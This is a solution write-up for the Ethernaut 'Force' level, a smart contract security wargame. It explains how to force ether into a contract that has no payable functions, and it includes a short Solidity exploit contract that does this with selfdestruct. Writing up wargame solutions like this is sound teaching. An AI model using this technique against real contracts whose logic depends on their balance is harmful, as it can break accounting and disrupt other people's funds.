---
description: >-
  In Ethernaut's Force, we are asked to send ether to a contract that has no
  apparent means of receiving it.
---

# 7 - Force

### Notes

Smart contracts, like EOA's, have their own addresses and balances.

The contract is empty and its ABI shows there are no public methods to call. Without a `fallback`, `receive`, or any `payable` functions, we cannot send ether to this address.

What we can do is deploy another contract that pays its balance to `Force` before self-destructing. The Force contract cannot send the transaction back as our exploit contract will cease to exist to receive the returned funds. We will ensure our exploit contract has a balance by marking its `constructor` payable.

### Scripted Solution

```solidity
pragma solidity ^0.8.0;

contract ForceExploit {
    constructor() payable {}

    /**
     * @dev Send balance to `contractAddress` before self destructing.
     */
    function payContractAndSelfDestruct(address payable contractAddress) public {
        selfdestruct(contractAddress);
    }
}
```
